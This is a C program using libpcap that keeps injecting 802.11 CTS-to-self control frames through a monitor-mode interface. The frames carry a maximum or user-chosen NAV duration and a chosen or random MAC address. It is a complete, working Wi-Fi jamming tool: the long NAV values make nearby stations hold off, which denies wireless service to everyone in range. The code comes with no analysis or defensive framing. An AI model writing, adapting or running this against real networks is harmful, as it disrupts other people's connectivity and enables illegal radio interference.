#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <time.h>
#include <signal.h>

volatile sig_atomic_t keep_running = 1;

void handle_sigint(int signum) {
    printf("\nReceived signal %d, cleaning up...\n", signum);
    keep_running = 0;
}

int main(int argc, char *argv[]) {
    
    if (argc < 2 || argc > 4) {
        fprintf(stderr, "Usage: %s <monitor_interface> [mac_address|\"random\"] [duration_us]\n", argv[0]);
        fprintf(stderr, "Example 1 (Defaults):   %s wlan0mon\n", argv[0]);
        fprintf(stderr, "Example 2 (Specific):   %s wlan0mon 11:22:33:44:55:66 15000\n", argv[0]);
        fprintf(stderr, "Example 3 (Random MAC): %s wlan0mon random 5000\n", argv[0]);
        return 1;
    }

    // 3. Configure the sigaction structure
    struct sigaction sa;
    sa.sa_handler = handle_sigint;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0; // Default behavior

    // 4. Register the handler for SIGINT
    if (sigaction(SIGINT, &sa, NULL) == -1) {
        perror("Failed to register signal handler");
        return 1;
    }


    char *device = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle;

    // 1. Open the device for packet injection
    handle = pcap_open_live(device, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Could not open device %s: %s\n", device, errbuf);
        return 2;
    }

    // 2. Handle MAC Address (Optional, Default: Random)
    unsigned int mac[6];
    if (argc >= 3 && strcmp(argv[2], "random") != 0) {
        if (sscanf(argv[2], "%x:%x:%x:%x:%x:%x", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) != 6) {
            fprintf(stderr, "Invalid MAC address format. Use XX:XX:XX:XX:XX:XX or \"random\"\n");
            pcap_close(handle);
            return 3;
        }
    } else {
        // Generate a random, locally administered, unicast MAC address
        srand(time(NULL));
        for (int i = 0; i < 6; i++) {
            mac[i] = rand() % 256;
        }
        mac[0] &= 0xFE; // Clear the least significant bit (Unicast)
        mac[0] |= 0x02; // Set the second least significant bit (Locally Administered)
        
        printf("Generated Random MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", 
               mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    }

    // 3. Handle Duration (Optional, Default: 32767)
    uint16_t duration_us = 32767; 
    if (argc == 4) {
        int input_duration = atoi(argv[3]);
        if (input_duration < 0 || input_duration > 32767) {
            fprintf(stderr, "Duration must be between 0 and 32767 microseconds.\n");
            pcap_close(handle);
            return 4;
        }
        duration_us = (uint16_t)input_duration;
    }

    // 4. Construct the packet
    uint8_t packet[18] = {
        // --- Radiotap Header (8 bytes) ---
        0x00, 0x00, 0x08, 0x00, 
        0x00, 0x00, 0x00, 0x00, 

        // --- 802.11 CTS Control Frame (10 bytes) ---
        0xc4, 0x00,             // Frame Control (CTS)
        0x00, 0x00,             // Duration (Will be dynamically set)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00 // Receiver Address (RA)
    };

    // Apply the duration dynamically (Little-Endian)
    packet[10] = duration_us & 0xFF;
    packet[11] = (duration_us >> 8) & 0xFF;

    // Fill in the RA with the MAC array
    for (int i = 0; i < 6; i++) {
        packet[12 + i] = (uint8_t)mac[i];
    }

    int bytes_written;
    // 5. Inject the single packet
    while(keep_running) {
        bytes_written = pcap_inject(handle, packet, sizeof(packet));
        if (bytes_written == -1) {
            pcap_perror(handle, "Error sending the packet: ");
        } //else {
          //  printf("Successfully injected %d bytes (CTS-to-Self with %d us NAV)\n", bytes_written, duration_us);
        //}
        // placeholder: wait until the CTS duration is over
        struct timespec ts;
        ts.tv_sec = 0;
        ts.tv_nsec = duration_us * 1000;
        nanosleep(&ts, NULL);
    
    }
    

    // 6. Cleanup
    pcap_close(handle);
    return 0;
}